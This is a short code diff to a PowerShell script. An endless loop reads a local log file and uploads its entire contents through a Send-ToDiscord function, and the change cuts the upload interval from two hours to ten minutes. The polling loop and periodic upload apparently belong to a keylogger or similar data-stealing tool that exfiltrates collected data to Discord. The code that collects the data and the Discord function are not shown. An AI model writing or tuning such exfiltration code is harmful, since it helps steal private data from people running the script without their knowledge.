@@ -60,7 +60,7 @@ while ($true) {
     $now = Get-Date
     $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }
 
-    if (($now - $lastSend).TotalMinutes -ge 120 -and (Test-Path $logFile)) {
+    if (($now - $lastSend).TotalMinutes -ge 10 -and (Test-Path $logFile)) {
         $data = Get-Content $logFile -Raw
         if ($data) {
             if (Send-ToDiscord -content $data) {
@@ -72,3 +72,4 @@ while ($true) {
 
     Start-Sleep -Milliseconds 200
 }
+
